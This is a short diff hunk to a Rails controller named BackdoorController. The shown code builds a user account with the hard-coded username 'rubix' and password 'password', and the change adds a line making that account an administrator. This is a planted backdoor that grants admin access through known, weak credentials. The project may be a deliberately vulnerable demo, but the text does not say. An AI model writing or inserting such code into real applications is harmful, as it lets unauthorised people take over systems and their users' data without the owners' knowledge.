@@ -4,6 +4,7 @@ class BackdoorController < ApplicationController
     user.password = 'password'
     user.password_confirmation = 'password'
     user.username = 'rubix'
+    user.admin = true
 
     user.save
   end
